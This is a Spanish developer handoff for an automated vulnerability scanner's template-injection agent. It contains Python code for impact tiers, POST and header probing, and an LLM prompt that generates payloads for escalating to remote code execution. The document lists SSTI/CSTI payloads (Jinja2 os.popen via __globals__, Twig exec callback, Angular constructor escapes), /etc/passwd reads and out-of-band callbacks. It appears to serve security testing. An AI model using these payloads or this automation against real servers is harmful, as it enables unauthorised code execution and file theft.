# CSTI Agent Improvements Handoff

**Fecha:** 2026-01-23
**Basado en:** Mejoras implementadas en XSS Agent
**Archivo objetivo:** `bugtrace/agents/csti_agent.py`

---

## Resumen

Este documento describe cómo aplicar las mismas 6 mejoras que se implementaron en el XSS Agent al CSTI Agent (Client-Side Template Injection).

---

## Estado Actual del CSTI Agent

### Estructura (777 líneas):
- `TemplateEngineFingerprinter` - Detecta Angular, Vue, Jinja2, Twig, etc.
- `PAYLOAD_LIBRARY` - Payloads organizados por motor de templates
- `CSTIAgent` - Clase principal
- Flujo: WAF → Interactsh → Fingerprint → Targeted → Universal → OOB → LLM

### Lo que YA tiene:
- ✅ Fingerprinting de motores de templates
- ✅ WAF detection con Q-Learning
- ✅ Interactsh para OOB
- ✅ LLM probe como fallback
- ✅ Encodings para bypass

### Lo que NO tiene (a implementar):
- ❌ Jerarquía de Victoria (early exit por impacto)
- ❌ LLM como Cerebro Principal (analiza DOM después, no antes)
- ❌ Vectores adicionales (POST, headers)
- ❌ Priorización de parámetros
- ❌ Screenshots correctamente guardados
- ❌ El mismo bug de enum en validator_engine (ya arreglado globalmente)

---

## Mejora 1: Jerarquía de Victoria

### Concepto:
Para CSTI/SSTI, la jerarquía es diferente a XSS:

```
TIER 3 (MÁXIMO IMPACTO) → STOP INMEDIATO:
- RCE confirmado (id, whoami, curl a interactsh)
- Lectura de archivos (config, /etc/passwd)

TIER 2 (ALTO IMPACTO) → STOP INMEDIATO:
- Acceso a objetos internos (config, __globals__)
- Sandbox bypass confirmado

TIER 1 (MEDIO IMPACTO) → 1 intento más:
- Evaluación aritmética (49 de 7*7)

TIER 0 (BAJO IMPACTO) → Continuar:
- Solo reflexión sin evaluación
```

### Código a añadir (después de `__init__`):

```python
# =========================================================================
# VICTORY HIERARCHY: Early exit based on payload impact
# =========================================================================

HIGH_IMPACT_INDICATORS = [
    "id=",           # RCE: id command output
    "uid=",          # RCE: uid from id
    "whoami",        # RCE: whoami output
    "/etc/passwd",   # File read
    "root:",         # passwd content
    "__globals__",   # Python internals access
    "os.popen",      # Command execution
    "subprocess",    # Command execution
]

MEDIUM_IMPACT_INDICATORS = [
    "49",            # Arithmetic evaluation (7*7)
    "Config",        # Config access
    "SECRET",        # Secret key access
]

def _get_payload_impact_tier(self, payload: str, response: str) -> int:
    """
    Determine impact tier for CSTI/SSTI.

    Returns:
        3 = RCE/File Read → STOP IMMEDIATELY
        2 = Internals Access → STOP IMMEDIATELY
        1 = Arithmetic Eval → Try 1 more
        0 = No impact → Continue
    """
    combined = (payload + " " + response).lower()

    # TIER 3: RCE or File Read
    if any(ind.lower() in combined for ind in ["uid=", "whoami", "root:", "/etc/passwd"]):
        return 3

    # TIER 2: Internals Access
    if any(ind.lower() in combined for ind in ["__globals__", "os.popen", "config"]):
        return 2

    # TIER 1: Arithmetic Evaluation
    if "49" in response and "7*7" in payload:
        return 1

    return 0

def _should_stop_testing(self, payload: str, response: str, successful_count: int) -> Tuple[bool, str]:
    """Determine if we should stop based on Victory Hierarchy."""
    impact_tier = self._get_payload_impact_tier(payload, response)

    if impact_tier >= 3:
        self._max_impact_achieved = True
        return True, "🏆 MAXIMUM IMPACT: RCE or File Read achieved"

    if impact_tier >= 2:
        self._max_impact_achieved = True
        return True, "🏆 HIGH IMPACT: Internals access confirmed"

    if impact_tier >= 1 and successful_count >= 1:
        return True, "✅ Template evaluation confirmed"

    if successful_count >= 2:
        return True, "⚡ 2 successful payloads, moving on"

    return False, ""
```

### Integración en `run_loop`:

```python
# En __init__, añadir:
self._max_impact_achieved = False

# En run_loop, modificar el loop:
for item in self.params:
    if self._max_impact_achieved:
        dashboard.log(f"[{self.name}] 🏆 Max impact achieved, skipping remaining params", "SUCCESS")
        break
    # ... resto del código
```

---

## Mejora 2: LLM como Cerebro Principal

### Concepto:
Actualmente el LLM solo se usa como fallback (Phase 6). Debería ser el cerebro principal que analiza el HTML y genera payloads específicos para el motor detectado.

### Código a añadir:

```python
async def _llm_smart_template_analysis(
    self,
    html: str,
    param: str,
    detected_engines: List[str],
    interactsh_url: str
) -> List[Dict]:
    """
    LLM-First Strategy: Analyze HTML and generate targeted CSTI/SSTI payloads.
    """
    system_prompt = """You are an elite Template Injection specialist.

CSTI (Client-Side): Angular, Vue - executes in browser
SSTI (Server-Side): Jinja2, Twig, Freemarker - executes on server (more dangerous)

For each engine, you must know:
- Angular 1.x: {{constructor.constructor('code')()}} - sandbox bypass needed
- Vue 2.x: {{_c.constructor('code')()}}
- Jinja2: {{config}}, {{lipsum.__globals__['os'].popen('cmd').read()}}
- Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}

CRITICAL: Generate payloads that:
1. Prove code execution (not just reflection)
2. Include OOB callback for blind detection
3. Escalate to RCE if SSTI (server-side)"""

    user_prompt = f"""Analyze this page for Template Injection:

URL: {self.url}
Parameter: {param}
Detected Engines: {detected_engines}
OOB Callback: {interactsh_url}

HTML (truncated):
```html
{html[:6000]}
```

Generate 1-3 PRECISE payloads for the detected engine(s).
For each payload, explain:
1. Target engine
2. What it exploits (sandbox bypass, RCE, etc.)
3. Expected output

Response format (XML):
<payloads>
  <payload>
    <engine>angular|vue|jinja2|twig|etc</engine>
    <code>THE_PAYLOAD</code>
    <exploitation>What it does</exploitation>
    <expected_output>What to look for</expected_output>
  </payload>
</payloads>"""

    try:
        response = await llm_client.generate(
            prompt=user_prompt,
            module_name="CSTI_SMART_ANALYSIS",
            system_prompt=system_prompt,
            model_override=settings.MUTATION_MODEL,
            max_tokens=3000,
            temperature=0.3
        )

        return self._parse_llm_payloads(response, interactsh_url)
    except Exception as e:
        logger.error(f"LLM Smart Analysis failed: {e}")
        return []
```

### Integración en `run_loop` (ANTES de targeted_probe):

```python
# Phase 2.5: LLM Smart Analysis (PRIMARY)
if engines != ["unknown"]:
    smart_payloads = await self._llm_smart_template_analysis(
        html, param, engines, self.interactsh.get_payload_url("csti", param)
    )

    for sp in smart_payloads:
        if self._max_impact_achieved:
            break

        success = await self._test_payload(session, param, sp["code"])
        if success:
            finding = self._create_finding(param, sp["code"], "llm_smart_analysis")
            all_findings.append(finding)

            should_stop, reason = self._should_stop_testing(sp["code"], "", len(all_findings))
            if should_stop:
                dashboard.log(f"[{self.name}] {reason}", "SUCCESS")
                break
```

---

## Mejora 3: Vectores Adicionales (POST, Headers)

### Código a añadir:

```python
async def _test_post_injection(
    self,
    session: aiohttp.ClientSession,
    param: str,
    engines: List[str]
) -> Optional[Dict]:
    """Test POST parameters for template injection."""
    payloads = PAYLOAD_LIBRARY.get(engines[0], PAYLOAD_LIBRARY["universal"])[:5]

    for payload in payloads:
        try:
            data = {param: payload}
            async with session.post(self.url, data=data, timeout=5) as resp:
                content = await resp.text()

                if "49" in content and "7*7" in payload and payload not in content:
                    return {
                        "type": "CSTI",
                        "url": self.url,
                        "parameter": f"POST:{param}",
                        "payload": payload,
                        "method": "post_injection",
                        "engine": engines[0]
                    }
        except Exception as e:
            logger.debug(f"POST test failed: {e}")

    return None

async def _test_header_injection(
    self,
    session: aiohttp.ClientSession,
    engines: List[str]
) -> Optional[Dict]:
    """Test headers for template injection (rare but possible)."""
    test_headers = ["Referer", "X-Forwarded-For", "User-Agent"]
    payload = "{{7*7}}"

    for header in test_headers:
        try:
            headers = {header: payload}
            async with session.get(self.url, headers=headers, timeout=5) as resp:
                content = await resp.text()

                if "49" in content:
                    return {
                        "type": "CSTI",
                        "url": self.url,
                        "parameter": f"HEADER:{header}",
                        "payload": payload,
                        "method": "header_injection",
                        "engine": "unknown"
                    }
        except:
            pass

    return None
```

### Integración en `run_loop` (después de OOB probe):

```python
# Phase 5.5: POST Injection
finding = await self._test_post_injection(session, param, engines)
if finding:
    all_findings.append(finding)
    continue

# Phase 5.6: Header Injection (rare)
if not all_findings:  # Only if nothing found yet
    finding = await self._test_header_injection(session, engines)
    if finding:
        all_findings.append(finding)
```

---

## Mejora 4: Priorización de Parámetros

### Código a añadir:

```python
# Parámetros más propensos a CSTI/SSTI
HIGH_PRIORITY_PARAMS = [
    # Template-related
    "template", "tpl", "view", "layout", "page",
    # Content rendering
    "content", "text", "body", "message", "msg",
    "title", "subject", "name", "description",
    # Dynamic
    "preview", "render", "output", "display",
    # Input
    "input", "value", "data", "query", "q", "search",
    # File/Path
    "file", "path", "include", "partial",
]

def _prioritize_params(self, params: List[Dict]) -> List[Dict]:
    """Prioritize parameters likely to be template-injectable."""
    high = []
    medium = []
    low = []

    for item in params:
        param = item.get("parameter", "").lower()

        is_high = any(hp in param or param in hp for hp in self.HIGH_PRIORITY_PARAMS)

        if is_high:
            high.append(item)
        elif any(x in param for x in ["id", "num", "page", "limit"]):
            low.append(item)
        else:
            medium.append(item)

    if high:
        logger.info(f"[{self.name}] 🎯 High-priority params: {[h['parameter'] for h in high]}")

    return high + medium + low
```

### Integración en `run_loop`:

```python
# Al inicio de run_loop:
self.params = self._prioritize_params(self.params)
```

---

## Mejora 5: Screenshots en DB

Esta mejora ya está aplicada globalmente en `database.py`. Solo asegúrate de que al crear findings, se incluya `screenshot_path`:

```python
def _create_finding(self, param: str, payload: str, method: str) -> Dict:
    return {
        "type": "CSTI",
        "url": self.url,
        "parameter": param,
        "payload": payload,
        "method": method,
        "screenshot_path": None,  # ← Asegurarse de incluir este campo
        "status": "VALIDATED_CONFIRMED",
        "validated": True,
        # ... resto
    }
```

---

## Mejora 6: Validación de Pendientes

Esta mejora ya está aplicada globalmente en `validator_engine.py`. El fix de enum también aplica a CSTI:

```python
# validator_engine.py ya corregido:
if vuln_type in ["XSS", "CSTI", "SSTI"]:
    needs_cdp.append(f)
```

---

## Orden de Implementación Recomendado

1. **Mejora 1 (Jerarquía Victoria)** - Impacto inmediato en eficiencia
2. **Mejora 4 (Priorización params)** - Fácil, mejora velocidad
3. **Mejora 2 (LLM Cerebro)** - Más complejo pero mayor precisión
4. **Mejora 3 (POST/Headers)** - Cobertura adicional
5. **Mejora 5 & 6** - Ya aplicadas globalmente

---

## Testing

Después de implementar, probar con:

```bash
# Target con Angular (CSTI)
python -m bugtrace scan https://example-angular-site.com

# Target con Jinja2 (SSTI)
python -m bugtrace scan https://example-flask-site.com

# Verificar:
# 1. Early exit cuando encuentra RCE
# 2. LLM genera payloads específicos para el motor
# 3. Parámetros prioritarios se prueban primero
```

---

## Archivos a Modificar

1. `bugtrace/agents/csti_agent.py` - Todas las mejoras
2. (Ya modificados globalmente):
   - `bugtrace/core/database.py` - Screenshots
   - `bugtrace/core/validator_engine.py` - Enum fix

---

## Notas Adicionales

- CSTI es client-side (Angular, Vue) - necesita browser/CDP para confirmar
- SSTI es server-side (Jinja2, Twig) - más peligroso, puede llevar a RCE
- El fingerprinting de motores es crítico para elegir payloads correctos
- Los payloads de SSTI pueden causar DoS si no se tiene cuidado (ej: loops infinitos)
